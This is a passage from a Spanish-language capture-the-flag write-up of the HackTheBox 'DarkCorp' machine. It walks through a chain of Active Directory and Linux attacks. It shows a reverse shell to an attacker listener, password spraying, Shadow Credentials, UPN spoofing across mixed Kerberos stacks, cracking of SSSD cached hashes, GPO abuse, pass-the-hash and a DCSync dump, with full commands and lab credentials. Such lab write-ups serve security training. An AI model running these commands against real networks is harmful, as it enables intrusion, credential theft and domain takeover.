Persist     : 0x00000002 (CRED_PERSIST_LOCAL_MACHINE)
Type        : 0x00000001 (CRED_TYPE_GENERIC)
Target      : LegacyGeneric:target=WEB-01
Description : Updated by: Administrator on: 1/16/2025
Unknown     : 
Username    : Administrator
Unknown     : Pack_Beneath_Solid9!
```

### Get Stored Credentials Via RunasCs

De forma alternativa, podemos utilizar el módulo `CredentialManager` desde `powershell` para leer credenciales almacenadas.

> [`CredentialManager`](https://www.powershellgallery.com/packages/CredentialManager/2.0) es un módulo de `PowerShell` de la comunidad utilizado para interactuar con el Administrador de credenciales de Windows (`Windows Credential Manager`).
{: .notice--info}

Al ejecutar el `cmdlet` `Get-StoredCredential` desde la consola actual con `evil-winrm-py`, obtendremos el [error `1312`](https://learn.microsoft.com/en-us/windows/win32/api/wincred/nf-wincred-credenumeratea#:~:text=The%20logon%20session%20does%20not%20exist%20or%20there%20is%20no%20credential%20set%20associated%20with%20this%20logon%20session%2E%20Network%20logon%20sessions%20do%20not%20have%20an%20associated%20credential%20set%2E)

``` powershell
evil-winrm-py PS C:\Programdata> Get-StoredCredential
CredEnumerate failed with the error code 1312.
```

Uno de los inconvenientes a la hora de acceder por `WinRM` es el tipo de sesión (`Logon Type`), debido a que cuando nos conectamos lo hace con un [`Logon Type 3 (Network)`](https://www.alteredsecurity.com/post/fantastic-windows-logon-types-and-where-to-find-credentials-in-them#:~:text=Logon%20Type%203%20%3A%20Network,-Logon).

> Herramientas como `RunasCs` nos permiten lanzar un nuevo tipo de sesión para un usuario.
{: .notice--info}

El error `1312` indica que la sesión especificada no existe o no tiene un conjunto de credenciales asociado. Esto ocurre principalmente al utilizar un tipo de sesión (`Logon Type`) `Network` o uno no interactivo (como `WinRM` o una tarea programada).

Iniciaremos un listener para recibir una shell

``` bash
rlwrap -cAr nc -lvnp 443
```

Lanzaremos la herramienta `RunasCs.exe` con el fin de lanzar un access token completo con un nuevo tipo de sesión. Por defecto, `Runas` lanza un tipo de sesión 2 ([`Interactive`](https://learn.microsoft.com/en-us/windows-server/identity/securing-privileged-access/reference-tools-logon-types#:~:text=Interactive%20%28also%20known%20as%2C%20Logon%20locally))

``` bash
evil-winrm-py PS C:\Programdata> upload RunasCs.exe .
evil-winrm-py PS C:\Programdata> .\RunasCs.exe Administrator 'But_Lying_Aid9!' -r 10.10.15.30:443 powershell
```

Volveremos a intentar utilizar el `cmdlet` `Get-StoredCredential` para interactuar con Windows Credentials Vault y obtener los secretos

``` bash
Connection from 10.129.5.241:49929
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> Get-StoredCredential
Get-StoredCredential

UserName                          Password
--------                          --------
Administrator System.Security.SecureString
```

Para obtener las credenciales en texto claro, podemos usar el método `GetNetworkCredential()`

``` bash
PS C:\Windows\system32> $cred = Get-StoredCredential
PS C:\Windows\system32> $cred.GetNetworkCredential() | Format-List

UserName       : Administrator
Password       : Pack_Beneath_Solid9!
SecurePassword : System.Security.SecureString
Domain         : 

```


## Password Spraying

Ahora que recuperamos una nueva contraseña en texto claro, podemos intentar hacer `Password Spraying` para verificar si se reutiliza en algún usuario del domnio.

> Como no he generado ningún listado de usuarios todavía, lo hice empleando la opción `--users` de `netexec` y aplicando filtros con `bash`.
{: .notice--warning}

``` bash
nxc smb "$DC_IP" -u 'victor.r' -p 'victor1gustavo@#' --users | sed '1,3d; $d' | awk '{print $5}' | tee users.txt                      
Administrator
Guest
krbtgt
victor.r
svc_acc
john.w
angela.w
angela.w.adm
taylor.b
taylor.b.adm
eugene.b
bryce.c
```

Herramientas como `kerbrute` nos permiten rápidamente hacer un ataque de `Password Spraying`

``` bash
kerbrute passwordspray users.txt -d darkcorp.htb --dc $DC_IP 'Pack_Beneath_Solid9!'

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 05/30/26 - Ronnie Flathers @ropnop

2026/05/30 00:11:20 >  Using KDC(s):
2026/05/30 00:11:20 >  	172.16.20.1:88

2026/05/30 00:11:22 >  [+] VALID LOGIN:	john.w@darkcorp.htb:Pack_Beneath_Solid9!
2026/05/30 00:11:22 >  Done! Tested 12 logins (1 successes) in 2.681 seconds
```

La contraseña es válida para el usuario `john.w`, podemos validarla con `netexec`

``` bash
nxc smb "$DC_IP" -u 'john.w' -p 'Pack_Beneath_Solid9!'                                     
SMB         172.16.20.1     445    DC-01            [*] Windows Server 2022 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:False) 
SMB         172.16.20.1     445    DC-01            [+] darkcorp.htb\john.w:Pack_Beneath_Solid9!
```


## Abusing AD ACL - `GenericWrite` Rights

El usuario `john.w` posee derechos `GenericWrite` sobre la cuenta `angela.w`. Esto permite modificar cualquier atributo modificable de un objeto, excepto propiedades que requieren permisos especiales (por ejemplo restablecer contraseña)

![image-center](/assets/images/posts/darkcorp-44-hackthebox.png)
{: .align-center}

### Shadow Credentials

Con este permiso una de las opciones de ataque es `Shadow Credentials`, el cual se aprovecha de un usuario a través de `PKINIT`.

> Esta técnica contempla modificar el atributo `msDS-KeyCredentialLink`, añadiendo credenciales alternativas en forma de certificados, permitiendo autenticarnos como el usuario víctima sin conocer su contraseña. 
{: .notice--info}

Podemos automatizar este proceso usando `certipy shadow auto` para directamente obtener las credenciales de la cuenta víctima

``` bash
certipy shadow auto -u 'john.w' -p 'Pack_Beneath_Solid9!' -account angela.w -dc-ip "$DC_IP" 
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Targeting user 'angela.w'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '94db6a544ad64797ad2e6667fcb20366'
[*] Adding Key Credential with device ID '94db6a544ad64797ad2e6667fcb20366' to the Key Credentials for 'angela.w'
[*] Successfully added Key Credential with device ID '94db6a544ad64797ad2e6667fcb20366' to the Key Credentials for 'angela.w'
[*] Authenticating as 'angela.w' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'angela.w@darkcorp.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'angela.w.ccache'
[*] Wrote credential cache to 'angela.w.ccache'
[*] Trying to retrieve NT hash for 'angela.w'
[*] Restoring the old Key Credentials for 'angela.w'
[*] Successfully restored the old Key Credentials for 'angela.w'
[*] NT hash for 'angela.w': 957246c8137069bca672dc6aa0af7c7a
```


## Abusing Mixed Vendors Kerberos Stacks

Estamos en un escenario donde tenemos un entorno mixto de `Kerberos`. Por un lado Active Directory, y por otro lado un entorno `Linux` unido al dominio. 

En el [siguiente artículo](https://www.pentestpartners.com/security-blog/a-broken-marriage-abusing-mixed-vendor-kerberos-stacks/) se menciona un problema de diseño en proveedores mixtos de `Kerberos`, además de cómo abusar de estos casos específicos para escalar privilegios en un proveedor de `Kerberos` que use `GSSAPI`

### Understanding Attack

> Es bien sabido que `Kerberos` es un protocolo de autenticación. Sin embargo, las decisiones de autorización se implementan fuera del propio protocolo, lo que da lugar a comportamientos divergentes entre distintos stacks.
{: .notice--info}

Escencialmente, esta vulnerabilidad radica en que un ecosistema de Active Directory gestiona la autenticación de forma diferente a los entornos Linux/Unix (que suelen implementar MIT o Heimdal Kerberos vía `GSSAPI`).

- `Windows`: Utiliza `Security Support Provider Interface` (`SSPI`), la autorización de un usuario depende estrictamente del `PAC` (`Privileged Attribute Certificate`).

- `Unix/Linux`: Se implementa mediante `GSSAPI`, el cual autentica. Sin embargo, el servicio objetivo (como `SSH`) es quién valida el campo `cname` del ticket y realiza una consulta secundario contra `LDAP` o una base de datos local para determinar los permisos del `Principal`.

Existe un problema con el atributo `userPrincipalName` (`UPN`) de las cuentas de usuario y de equipo dentro de Active Directory.

> Estas cuentas son susceptibles a la suplantación de identidad cuando proporcionan tickets `Kerberos` para servicios basados en `Unix` unidos a un dominio de Active Directory.
{: .notice--info}

Active Directory implementa un [algoritmo](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/6435d3fb-8cf6-4df5-a156-1277690ed59c) con fines de autenticación cuando se busca un principal dentro de un reino `Kerberos`. Este algoritmo realiza búsquedas en base al tipo de `name-type` utilizado.

- Si se utiliza `NT_PRINCIPAL`, se priorizará buscar en `samAccountName`.
- Si se utiliza `NT_ENTERPRISE`, se priorizará busaar en `userPrincipalName`.

![image-center](/assets/images/posts/darkcorp-45-hackthebox.png)
{: .align-center}

> Debido a que los proveedores `Kerberos` basados en Unix/Linux confían en el atributo `cname` de los tickets para identificar al `principal`, es posible suplantar la identidad de cuentas dentro de estos stacks.
{: .notice--info}

Si un atacante posee permisos de escritura sobre el conjunto de atributos `Public Information`, o `GenericWrite` sobre cualquier cuenta de usuario o equipo, puede cambiar el atributo `userPrincipalName` por el valor de `samAccountName` de otro usuario en ella.

> El valor de `userPrincipalName` no requiere el formato esperado (como `user@domain.com`). Es posible asignar directamente el valor de `samAccountName` del usuario que queremos suplantar.
{: .notice--danger}

De esta forma, cuando un atacante solicite un TGT especificando `NT_ENTERPRISE`, se priorizará `userPrincipalName` en la búsqueda, y se le entregará un TGT válido para el usuario que especificó en `UPN`.

> Cuando intentamos utilizar este ticket contra un servicio basado en Windows (`SSPI`), no será posible escalar privilegios debido a que `SSPI` siempre inspecciona el `PAC`, el cual contiene la  información real del usuario autenticado (como el `samAccountName` y su `SID`).
{: .notice--danger}

Este TGT resultando permitirá solicitar tickets de servicio válidos exclusivamente para conectarse a servicios `Kerberos` basados en `GSSAPI`

### Scenario

Para planificar nuestro ataque, debemos considerar lo siguientes factores: 

- La cuenta `angela.w.adm` es miembro del grupo `Linux_Admins`, posiblemente los miembros de este grupo puedan conectarse a la máquina `drip`.

- Tenemos permisos `GenricWrite` sobre la cuenta `angela.w`, por lo que podemos modificar atributos como `userPrincipalName`.

![image-center](/assets/images/posts/darkcorp-46-hackthebox.png)
{: .align-center}

Si miramos la configuración de `ssh`, notaremos que la máquina `drip` admite autenticación vía `GSSAPI`

``` bash
ebelford@drip:~$ cat /etc/ssh/sshd_config | grep GSSAPI
# GSSAPI options
GSSAPIAuthentication yes
GSSAPICleanupCredentials yes
#GSSAPIStrictAcceptorCheck yes
#GSSAPIKeyExchange no
```

> Modificaremos el `userPrincipalName` de la cuenta de `angela.w`, luego solicitarems un un TGT para la cuenta `angela.w.adm` y nos intentaremos conectar a la máquina `drip` usando ese ticket.
{: .notice--primary}

### UPN Spoofing

Comenzaremos este ataque modificando el `UPN` (`userPrincipalName`) de la cuenta `angela.w` asignando el valor del usuario objetivo. En este caso queremos suplantar a `angela.w.adm`

``` bash
certipy account update -u 'john.w' -p 'Pack_Beneath_Solid9!' -user angela.w -upn 'angela.w.adm' -dc-ip "$DC_IP"
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Updating user 'angela.w':
    userPrincipalName                   : angela.w.adm
[*] Successfully updated 'angela.w'
```

Ahora solicitaremos un TGT para la cuenta de `angela.w`, enviando el tipo de `principal` con el valor `NT_ENTERPRISE`, manteniendo el hash de `angela.w`

``` bash
getTGT.py "$DOMAIN"/angela.w.adm -hashes :957246c8137069bca672dc6aa0af7c7a -dc-ip "$DC_IP" -principalType NT_ENTERPRISE 
Impacket v0.13.0.dev0+20250717.182627.84ebce48 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in angela.w.adm.ccache
```

Podemos usar el comando `klist` para verificar que el principal está agisnado como el valor `angela.w.adm`

``` bash
export KRB5CCNAME="$(pwd)/angela.w.adm.ccache"
klist      
Ticket cache: FILE:/workspace/labs/machines/darkcorp/content/angela.w.adm.ccache
Default principal: angela.w.adm@DARKCORP.HTB

Valid starting       Expires              Service principal
05/30/2026 00:32:43  05/30/2026 10:32:43  krbtgt/DARKCORP.HTB@DARKCORP.HTB
	renew until 05/31/2026 00:32:45
```

Necesitaremos configurar un cliente `kerberos` en nuestra máquina, `netexec` permite generar rápidamente un archivo `krb5.conf`

``` bash
nxc smb DC-01.darkcorp.htb -k --generate-krb5-file ./krb5.conf
SMB        DC-01.darkcorp.htb 445    DC-01            [*] Windows Server 2022 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:False)
SMB         DC-01.darkcorp.htb    445    DC-01            [+] krb5 conf saved to: ./krb5.conf
SMB        DC-01.darkcorp.htb     445    DC-01            [+] Run the following command to use the conf file: export KRB5_CONFIG=./krb5.conf

cat krb5.conf -p

[libdefaults]
    dns_lookup_kdc = false
    dns_lookup_realm = false
    default_realm = DARKCORP.HTB

[realms]
    DARKCORP.HTB = {
        kdc = dc-01.darkcorp.htb
        admin_server = dc-01.darkcorp.htb
        default_domain = darkcorp.htb
    }

[domain_realm]
    .darkcorp.htb = DARKCORP.HTB
    darkcorp.htb = DARKCORP.HTB
```


## Shell as `angela.w.adm` - `drip`

Cuando nuestro cliente `kerberos` esté debidamente configurado: variable `KRB5CCNAME`, `KRB5_CONFIG` y reloj sincronizado, podremos conectarnos a la máquina `drip` por `ssh` usando el parámetro `-K`

``` bash
export KRB5_CONFIG=$(pwd)/krb5.conf

ssh -K angela.w.adm@drip.darkcorp.htb   
Linux drip 6.1.0-28-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.119-1 (2024-11-22) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Could not chdir to home directory /home/darkcorp.htb/angela.w.adm: No such file or directory
angela.w.adm@drip:/$ id
uid=1730401107(angela.w.adm) gid=1730400513(domain users) groups=1730400513(domain users),1730401109(linux_admins)
```

- `-K`: Habilitar el reenvío de credenciales `Kerberos`.

> También podríamos conectarnos a la cuenta `angela.w.adm` desde dentro usando el comando `ksu` y cargando el ticket en la variable `KRB5CCNAME`.
{: .notice--warning}

``` bash
# Transfer the TGT
sshpass 

ebelford@drip:/tmp$ KRB5CCNAME=angela.w.adm.ccache ksu angela.w.adm
```


## Shell as `root` - `drip`

Listando los privilegios que `angela.w.adm` posee a nivel de `Sudoers`, notaremos que puede ejecutar cualquier comando como cualquier usuario

``` bash
angela.w.adm@drip:/tmp$ sudo -l
Matching Defaults entries for angela.w.adm on drip:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User angela.w.adm may run the following commands on drip:
    (ALL : ALL) NOPASSWD: ALL
```

> La cuenta `taylor.b.adm` también es miembro del grupo `Linux_Admins`, por lo que habríamos logrado el mismo resultado a través de ella.
{: .notice--info}

``` bash
taylor.b.adm@drip:/$ sudo -l
Matching Defaults entries for taylor.b.adm on drip:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User taylor.b.adm may run the following commands on drip:
    (ALL : ALL) NOPASSWD: ALL
```

Escalaremos a `root` simplemente ejecutando `sudo su`

``` bash
angela.w.adm@drip:/tmp$ sudo su
```


## Linux System Enumeration

Podemos lanzar herramientas de enumeración como LinPEAS para buscar configuraciones que nos permitan movernos lateralmente por el dominio

``` bash
sshpass -p 'ThePlague61780' scp -oStrictHostKeyChecking=no linpeas.sh ebelford@drip.htb:/tmp
```

Durante la ejecución de `linpeas.sh`, veremos la configuración de `SSSD`.

> `SSSD` (`System Security Services Daemon`) es un servicio en sistemas `Linux` que gestiona la identidad y la autenticación. 
> 
> Actúa como un puente centralizado entre una máquina local y servidores centralizados de directorios (como `Active Directory`, `LDAP`, etc.).
{: .notice--info}

``` bash
root@drip:/# cat /etc/sssd/sssd.conf 

[sssd]
services = nss, pam
domains = darkcorp.htb

[domain/darkcorp.htb]
id_provider = ad
cache_credentials = True
auth_provider = ad
access_provider = simple
default_shell = /bin/bash
use_fully_qualified_names= False
krb5_store_password_if_offline = True
simple_allow_groups = linux_admins
```

En este caso la configuración del proveedor nos dice que utiliza el dominio de `Active Directory`


## Abusing `SSSD` - Cached Domain Credentials

La directiva `cache_credentials = True` significa que las credenciales se cachean localmente. 

Esto permite que el acceso siga funcionando aunque no se pueda acceder al proveedor. Pero también nos permite extraerlas para intentar descifrarlas localmente.

Las credenciales cacheadas por `sssd`se guardan en una base de datos local en la ruta  `/var/lib/sss/db/cache_domain.com.ldb`

``` bash
root@drip:~# ls -la /var/lib/sss/db/
total 5356
drwx------  2 root root    4096 May 29 22:46 .
drwxr-xr-x 10 root root    4096 Jan 10  2025 ..
-rw-------  1 root root 1609728 May 29 22:40 cache_darkcorp.htb.ldb
-rw-------  1 root root    2615 May 29 22:46 ccache_DARKCORP.HTB
-rw-------  1 root root 1286144 May 29 11:31 config.ldb
-rw-------  1 root root 1286144 Dec 30  2024 sssd.ldb
-rw-------  1 root root 1286144 May 29 22:40 timestamps_darkcorp.htb.ldb
```

Usando el comando `strings` y buscando por la palabra `cachedPassword` encontraremos las credenciales almacenadas en esta base de datos

``` bash
root@drip:~# strings /var/lib/sss/db/cache_darkcorp.htb.ldb | grep -B 9 "cachedPassword"
nameAlias
taylor.b.adm@darkcorp.htb
isPosix
TRUE
lastUpdate
1736373877
initgrExpireTimestamp
ccacheFile
FILE:/tmp/krb5cc_1730414101_B5njUL
cachedPassword
$6$5wwc6mW6nrcRD4Uu$9rigmpKLyqH/.hQ520PzqN2/6u6PZpQQ93ESam/OHvlnQKQppk6DrNjL6ruzY7WJkA2FjPgULqxlb73xNw7n5.
cachedPasswordType
--
nameAlias
taylor.b.adm@darkcorp.htb
isPosix
TRUE
lastUpdate
1736373877
initgrExpireTimestamp
ccacheFile
FILE:/tmp/krb5cc_1730414101_B5njUL
cachedPassword
$6$5wwc6mW6nrcRD4Uu$9rigmpKLyqH/.hQ520PzqN2/6u6PZpQQ93ESam/OHvlnQKQppk6DrNjL6ruzY7WJkA2FjPgULqxlb73xNw7n5.
cachedPasswordType
```


### Hash Cracking

En este caso las credenciales están hasheadas usando el algoritmo `SHA-512-Crypt`. Podemos intentar crackearlas usando herramientas como `hashcat` o `john`

``` bash
john --wordlist=/usr/local/share/wordlists/rockyou.txt hashes.txt --format=sha512crypt       
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE4.1 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Press 'q' or Ctrl-C to abort, almost any other key for status
!QAZzaq1         (?)
1g 0:00:04:12 DONE (2026-05-30 01:25) 0.003957g/s 393.3p/s 393.3c/s 393.3C/s 013183..yippee
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Logramos descifrar la contraseña, la cual corresponde a la cuenta `taylor.b.adm`. La validaremos en el dominio usando `netexec`

``` bash
nxc smb "$DC_IP" -u 'taylor.b.adm' -p '!QAZzaq1'
SMB         172.16.20.1     445    DC-01            [*] Windows Server 2022 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:False) 
SMB         172.16.20.1     445    DC-01            [+] darkcorp.htb\taylor.b.adm:!QAZzaq1
```


## Shell as `taylor.b.adm` - `DC-01`

La cuenta `taylor.b.adm` es miembro del grupo `Remote Management Users`. Esto le permite conectarse remotamente usando el protocolo `WinRM`

``` bash
evil-winrm-py -i "$DC_IP" -u taylor.b.adm -p '!QAZzaq1' 
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.5.0

[*] Connecting to '172.16.20.1:5985' as 'taylor.b.adm'
evil-winrm-py PS C:\Users\taylor.b.adm\Documents> whoami
darkcorp\taylor.b.adm
```


## Abusing Group Policy Objects (GPO)

> GPO ([`Group Policy Object`](https://learn.microsoft.com/es-es/windows-server/identity/ad-ds/manage/group-policy/group-policy-overview)) es un conjunto de configuraciones que se pueden aplicar a usuarios y equipos dentro de un dominio de Active Directory. 
> 
> Estas configuraciones determinan el comportamiento de los usuarios y/o equipos dentro de un dominio.
{: .notice--info}

La cuenta `taylor.b.adm` es miembro del grupo `GPO_Manager`, el cual a su vez posee control sobre la `GPO` (`Group Policy Object`) `SecurityUpdates` a través de los permisos `GenericWrite`, `WriteOwner` y `WriteDacl`

![image-center](/assets/images/posts/darkcorp-47-hackthebox.png)
{: .align-center}

Esto le otroga control para modifcar la estructura interna de la GPO para ejecutar acciones maliciosas.

> Las políticas de grupo pueden incluir opciones de seguridad, claves de registro, instalación de software y scripts para el inicio y el apagado; además, los miembros del dominio actualizan la configuración de las políticas de grupo cada 90 minutos de forma predeterminada (cada 5 minutos en el caso de los controladores de dominio). 
> 
> Esto significa que la política de grupo aplica la configuración establecida en el equipo de destino.
> ([`adsecurity.org`](https://adsecurity.org/?p=2716)).
{: .notice--info}

### Defender

Si ejecutamos alguna herramienta dentro del Controlador de Dominio, volveremos a experimentar el bloqueo vía Windows Defender. En este punto podemos utilizar técnicas como ejecutar el binario en memoria, ofuscarlo, etc.

``` bash
evil-winrm-py PS C:\Programdata> upload SharpGPOAbuse.exe .
evil-winrm-py PS C:\Programdata> .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount taylor.b.adm --GPOName "SECURITYUPDATES"
Program 'SharpGPOAbuse.exe' failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted softwareAt line:1 char:1
+ .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount taylor.b.adm --GPON ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~.
```

Podemos usar el `cmdlet` `Get-GPO -All` para listar todas las GPOs disponibles (ya sé que puedo ver el `Id` desde BloodHound pero quiero ejecutar un poco de `powershell`, déjame en paz)

``` bash
evil-winrm-py PS C:\Programdata> Get-GPO -All


DisplayName      : Default Domain Policy
DomainName       : darkcorp.htb
Owner            : darkcorp\Domain Admins
Id               : 31b2f340-016d-11d2-945f-00c04fb984f9
GpoStatus        : AllSettingsEnabled
Description      : 
CreationTime     : 12/29/2024 3:28:27 PM
ModificationTime : 12/29/2024 4:31:46 PM
UserVersion      : AD Version: 0, SysVol Version: 0
ComputerVersion  : AD Version: 3, SysVol Version: 3
WmiFilter        : 

DisplayName      : SecurityUpdates
DomainName       : darkcorp.htb
Owner            : darkcorp\Domain Admins
Id               : 652cae9a-4bb7-49f2-9e52-3361f33ce786
GpoStatus        : AllSettingsEnabled
Description      : Windows Security Group Policy
CreationTime     : 1/3/2025 3:01:12 PM
ModificationTime : 1/3/2025 4:01:12 PM
UserVersion      : AD Version: 0, SysVol Version: 0
ComputerVersion  : AD Version: 0, SysVol Version: 0
WmiFilter        : 

DisplayName      : Default Domain Controllers Policy
DomainName       : darkcorp.htb
Owner            : darkcorp\Domain Admins
Id               : 6ac1786c-016f-11d2-945f-00c04fb984f9
GpoStatus        : AllSettingsEnabled
Description      : 
CreationTime     : 12/29/2024 3:28:27 PM
ModificationTime : 5/29/2026 12:29:14 PM
UserVersion      : AD Version: 0, SysVol Version: 0
ComputerVersion  : AD Version: 36, SysVol Version: 36
WmiFilter        : 
```

### pyGPOAbuse.py

En mi caso opté por la opción más sencilla y es ejecutar el ataque desde fuera con herramientas como `pyGPOAbuse.py`.

Las posibilidades son inmensas, en mi caso añadí la cuenta `taylor.b.adm` al grupo `Administrators` local

``` bash
pygpoabuse.py "$DOMAIN"/taylor.b.adm:'!QAZzaq1' -gpo-id "652cae9a-4bb7-49f2-9e52-3361f33ce786" -command 'net localgroup Administrators taylor.b.adm /add' -f -dc-ip $DC_IP
SUCCESS:root:ScheduledTask TASK_fb049f01 created!
[+] ScheduledTask TASK_fb049f01 created!
```

- `-f`: Forzar una tarea programda inmediata.


## Root Time

Al cabo de unos instantes, tendremos privilegios administrativos dentro del `DC`

``` bash
nxc smb "$DC_IP" -u 'taylor.b.adm' -p '!QAZzaq1'
SMB         172.16.20.1     445    DC-01            [*] Windows Server 2022 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:False) 
SMB         172.16.20.1     445    DC-01            [+] darkcorp.htb\taylor.b.adm:!QAZzaq1 (admin)
```

### Credential Dumping

En este punto ya podemos leer la flag, pero sinceramente prefiero conectarme como `Administrator` o ganar una shell como `nt authority\system`.

Una opción rápida sería dumpear la `SAM` usando `netexec`

``` bash
nxc smb "$DC_IP" -u 'taylor.b.adm' -p '!QAZzaq1' --sam
SMB         172.16.20.1     445    DC-01            [*] Windows Server 2022 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:False) 
SMB         172.16.20.1     445    DC-01            [+] darkcorp.htb\taylor.b.adm:!QAZzaq1 (admin)
SMB         172.16.20.1     445    DC-01            [*] Dumping SAM hashes
SMB         172.16.20.1     445    DC-01            Administrator:500:aad3b435b51404eeaad3b435b51404ee:fcb3ca5a19a1ccf2d14c13e8b64cde0f:::
SMB         172.16.20.1     445    DC-01            Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         172.16.20.1     445    DC-01            DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[02:02:48] ERROR    SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.                   regsecrets.py:436
SMB         172.16.20.1     445    DC-01            [+] Added 3 SAM hashes to the database
```


### Shell as `Administrator` - `DC-01`

Una vez tenemos el hash NT del usuario `Administrator` a disposición, podemos usarlo para conectarnos al Controlador de Dominio haciendo `PassTheHash`

``` bash
evil-winrm-py -i "$DC_IP" -u Administrator -H 'fcb3ca5a19a1ccf2d14c13e8b64cde0f'
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.5.0

[*] Connecting to '172.16.20.1:5985' as 'Administrator'
evil-winrm-py PS C:\Users\Administrator\Documents> whoami
darkcorp\administrator
evil-winrm-py PS C:\Users\Administrator\Documents> type ..\Desktop\root.txt
0aa...
```


## (Bonus) DCSync

> `DCSync` es un ataque que permite **simular el comportamiento de un controlador de dominio** (DC) y recuperar datos de contraseñas a través de la replicación de dominios
{: .notice--info}

De forma alternativa, podemos realizar un ataque `DCSync` para extraer todos los hashes del dominio

``` bash
secretsdump.py darkcorp.htb/taylor.b.adm:'!QAZzaq1'@DC-01.darkcorp.htb
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xe7c8f385f342172c7b0267fe4f3cbbd6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fcb3ca5a19a1ccf2d14c13e8b64cde0f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
darkcorp\DC-01$:aes256-cts-hmac-sha1-96:23f8c53f91fd2035d0dc5163341bd883cc051c1ba998f5aed318cd0d820fa1b2
darkcorp\DC-01$:aes128-cts-hmac-sha1-96:2715a4681263d6f9daf03b7dd7065a23
darkcorp\DC-01$:des-cbc-md5:eca71034201a3826
darkcorp\DC-01$:plain_password_hex:90d17589c9c348f3ea541982f161b1f658cec76e33e32762cba25cf55643a853efd93dd5cffec0cba16e008a2c7112715437d6a33b72e28405c53f68965349b0676128c9cb1997717523971bdaf255f72d9664d3ed5c06f1e5eb3a5b2ef6dc435727ed160e340591724e1230782e2484e25f8484a7b21bf102f71c9a91219cc23743377526a9c73eec8a70def939e673dd244d21be9ec18ba0d915bc080e8bfb3ac8953b5c6e64adb1107b062ddad75ce0e1f805bcdb52de979599787fac9d8246807055b4671191a41804f7918da2b82e3a4fde2959cd227a8af08982a89bcc7437e13426e8ff74273c4e0538a65eeb
darkcorp\DC-01$:aad3b435b51404eeaad3b435b51404ee:45d397447e9d8a8c181655c27ef31d28:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x395bad4405a9fd2285737a8ce7c6d9d60e6fceb3
dpapi_userkey:0x3f426bba655ad645920a84d740836ed1edf35836
[*] NL$KM 
 0000   65 DB D5 E7 F9 08 5C 24  AB 45 B5 E5 5D E5 3F DD   e.....\$.E..].?.
 0010   89 93 2A C7 F3 70 1E 5A  B7 8D 4E D3 BA 3B 5F 0C   ..*..p.Z..N..;_.
 0020   A9 FC 32 69 57 6D E6 78  D0 07 33 43 FE 1E 06 A6   ..2iWm.x..3C....
 0030   1E 56 2C 27 91 47 56 54  91 0D 20 79 E7 7A 2F 95   .V,'.GVT.. y.z/.
NL$KM:65dbd5e7f9085c24ab45b5e55de53fdd89932ac7f3701e5ab78d4ed3ba3b5f0ca9fc3269576de678d0073343fe1e06a61e562c2791475654910d2079e77a2f95
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
